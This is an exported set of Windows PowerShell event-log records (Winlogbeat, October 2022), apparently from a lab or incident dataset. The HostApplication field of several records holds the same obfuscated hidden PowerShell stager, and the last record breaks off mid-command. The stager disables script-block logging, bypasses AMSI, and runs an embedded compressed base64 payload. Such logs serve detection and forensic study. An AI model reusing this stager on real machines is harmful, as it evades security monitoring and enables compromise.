	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $h8=(('En{1}'+'ble'+'Sc{3}ipt{2'+'}lock{'+'0}o'+'gging')-f'L','a','B','r'); $gG=(('Script{2}loc{1'+'}'+'L'+'og'+'gi{0}g')-f'n','k','B'); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''+'Enabl'+'{5}Sc'+'{2}iptBlo'+'c{3}{1}n{4'+'}oca'+'tion{0}ogging'+'')-f'L','I','r','k','v','e');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType((('{'+'5}{'+'0}stem.{1}{'+'9'+'}n'+'{'+'9}'+'{2}'+'ement.{'+'7}{4}t'+'{8}m'+'{9'+'}'+'t'+'i{8}n.{7'+'}'+'ms'+'i{3}'+'ti{6'+'}s'+'')-f'y','M','g','U','u','S','l','A','o','a')); if ($xY) { $xY.GetField(((''+'am'+'{4}'+'i'+'{'+'3}'+'{1}'+'i{2}Fai{0}ed'+'')-f'l','n','t','I','s'),'NonPublic,Static').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType((('S{2}stem.{4}an'+'a{'+'1}'+'e'+'ment.A{'+'5}tomati'+'on.{0'+'}ti{3}s')-f'U','g','y','l','M','u')); $hbx=$zz4.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType((('Sy{3'+'}t'+'e'+'m.Mana{'+'2}em'+'ent.{1}{5}to'+'mation.Sc'+'ri{'+'0}tB{4}ock')-f'p','A','g','s','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb'+'46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E'+'43K'+'WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz'+'QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk'+'uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y'+'ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B'+'hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA'+'W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm'+'/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly'+'N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy'+'XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg'+'M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0'+'xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD'+'X0YT72p7Tu+yPUGQYu0+12R3'+'OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+'+'YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F'+'R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+'+'1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq'+'h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8'+'iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}')-f'=','o')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4567,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:53:44.118",inkMBIQByII7dpeERBAG,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:53:44.409","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b709d961-66c2-4b85-8bec-dbac427e0b44
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $h8=(('En{1}'+'ble'+'Sc{3}ipt{2'+'}lock{'+'0}o'+'gging')-f'L','a','B','r'); $gG=(('Script{2}loc{1'+'}'+'L'+'og'+'gi{0}g')-f'n','k','B'); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''+'Enabl'+'{5}Sc'+'{2}iptBlo'+'c{3}{1}n{4'+'}oca'+'tion{0}ogging'+'')-f'L','I','r','k','v','e');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType((('{'+'5}{'+'0}stem.{1}{'+'9'+'}n'+'{'+'9}'+'{2}'+'ement.{'+'7}{4}t'+'{8}m'+'{9'+'}'+'t'+'i{8}n.{7'+'}'+'ms'+'i{3}'+'ti{6'+'}s'+'')-f'y','M','g','U','u','S','l','A','o','a')); if ($xY) { $xY.GetField(((''+'am'+'{4}'+'i'+'{'+'3}'+'{1}'+'i{2}Fai{0}ed'+'')-f'l','n','t','I','s'),'NonPublic,Static').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType((('S{2}stem.{4}an'+'a{'+'1}'+'e'+'ment.A{'+'5}tomati'+'on.{0'+'}ti{3}s')-f'U','g','y','l','M','u')); $hbx=$zz4.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType((('Sy{3'+'}t'+'e'+'m.Mana{'+'2}em'+'ent.{1}{5}to'+'mation.Sc'+'ri{'+'0}tB{4}ock')-f'p','A','g','s','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb'+'46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E'+'43K'+'WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz'+'QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk'+'uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y'+'ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B'+'hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA'+'W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm'+'/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly'+'N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy'+'XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg'+'M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0'+'xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD'+'X0YT72p7Tu+yPUGQYu0+12R3'+'OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+'+'YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F'+'R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+'+'1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq'+'h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8'+'iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}')-f'=','o')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Function,"-","-","-","-",Started,"-","-","-","	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b709d961-66c2-4b85-8bec-dbac427e0b44
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $h8=(('En{1}'+'ble'+'Sc{3}ipt{2'+'}lock{'+'0}o'+'gging')-f'L','a','B','r'); $gG=(('Script{2}loc{1'+'}'+'L'+'og'+'gi{0}g')-f'n','k','B'); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''+'Enabl'+'{5}Sc'+'{2}iptBlo'+'c{3}{1}n{4'+'}oca'+'tion{0}ogging'+'')-f'L','I','r','k','v','e');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType((('{'+'5}{'+'0}stem.{1}{'+'9'+'}n'+'{'+'9}'+'{2}'+'ement.{'+'7}{4}t'+'{8}m'+'{9'+'}'+'t'+'i{8}n.{7'+'}'+'ms'+'i{3}'+'ti{6'+'}s'+'')-f'y','M','g','U','u','S','l','A','o','a')); if ($xY) { $xY.GetField(((''+'am'+'{4}'+'i'+'{'+'3}'+'{1}'+'i{2}Fai{0}ed'+'')-f'l','n','t','I','s'),'NonPublic,Static').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType((('S{2}stem.{4}an'+'a{'+'1}'+'e'+'ment.A{'+'5}tomati'+'on.{0'+'}ti{3}s')-f'U','g','y','l','M','u')); $hbx=$zz4.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType((('Sy{3'+'}t'+'e'+'m.Mana{'+'2}em'+'ent.{1}{5}to'+'mation.Sc'+'ri{'+'0}tB{4}ock')-f'p','A','g','s','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb'+'46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E'+'43K'+'WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz'+'QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk'+'uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y'+'ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B'+'hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA'+'W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm'+'/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly'+'N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy'+'XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg'+'M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0'+'xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD'+'X0YT72p7Tu+yPUGQYu0+12R3'+'OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+'+'YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F'+'R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+'+'1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq'+'h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8'+'iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}')-f'=','o')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4568,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:53:44.088",iHkMBIQByII7dpeERBAG,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:53:44.409","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b709d961-66c2-4b85-8bec-dbac427e0b44
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $h8=(('En{1}'+'ble'+'Sc{3}ipt{2'+'}lock{'+'0}o'+'gging')-f'L','a','B','r'); $gG=(('Script{2}loc{1'+'}'+'L'+'og'+'gi{0}g')-f'n','k','B'); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''+'Enabl'+'{5}Sc'+'{2}iptBlo'+'c{3}{1}n{4'+'}oca'+'tion{0}ogging'+'')-f'L','I','r','k','v','e');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType((('{'+'5}{'+'0}stem.{1}{'+'9'+'}n'+'{'+'9}'+'{2}'+'ement.{'+'7}{4}t'+'{8}m'+'{9'+'}'+'t'+'i{8}n.{7'+'}'+'ms'+'i{3}'+'ti{6'+'}s'+'')-f'y','M','g','U','u','S','l','A','o','a')); if ($xY) { $xY.GetField(((''+'am'+'{4}'+'i'+'{'+'3}'+'{1}'+'i{2}Fai{0}ed'+'')-f'l','n','t','I','s'),'NonPublic,Static').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType((('S{2}stem.{4}an'+'a{'+'1}'+'e'+'ment.A{'+'5}tomati'+'on.{0'+'}ti{3}s')-f'U','g','y','l','M','u')); $hbx=$zz4.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType((('Sy{3'+'}t'+'e'+'m.Mana{'+'2}em'+'ent.{1}{5}to'+'mation.Sc'+'ri{'+'0}tB{4}ock')-f'p','A','g','s','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb'+'46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E'+'43K'+'WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz'+'QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk'+'uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y'+'ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B'+'hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA'+'W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm'+'/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly'+'N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy'+'XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg'+'M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0'+'xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD'+'X0YT72p7Tu+yPUGQYu0+12R3'+'OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+'+'YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F'+'R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+'+'1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq'+'h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8'+'iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}')-f'=','o')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Environment,"-","-","-","-",Started,"-","-","-","	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b709d961-66c2-4b85-8bec-dbac427e0b44
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $h8=(('En{1}'+'ble'+'Sc{3}ipt{2'+'}lock{'+'0}o'+'gging')-f'L','a','B','r'); $gG=(('Script{2}loc{1'+'}'+'L'+'og'+'gi{0}g')-f'n','k','B'); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''+'Enabl'+'{5}Sc'+'{2}iptBlo'+'c{3}{1}n{4'+'}oca'+'tion{0}ogging'+'')-f'L','I','r','k','v','e');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType((('{'+'5}{'+'0}stem.{1}{'+'9'+'}n'+'{'+'9}'+'{2}'+'ement.{'+'7}{4}t'+'{8}m'+'{9'+'}'+'t'+'i{8}n.{7'+'}'+'ms'+'i{3}'+'ti{6'+'}s'+'')-f'y','M','g','U','u','S','l','A','o','a')); if ($xY) { $xY.GetField(((''+'am'+'{4}'+'i'+'{'+'3}'+'{1}'+'i{2}Fai{0}ed'+'')-f'l','n','t','I','s'),'NonPublic,Static').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType((('S{2}stem.{4}an'+'a{'+'1}'+'e'+'ment.A{'+'5}tomati'+'on.{0'+'}ti{3}s')-f'U','g','y','l','M','u')); $hbx=$zz4.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { 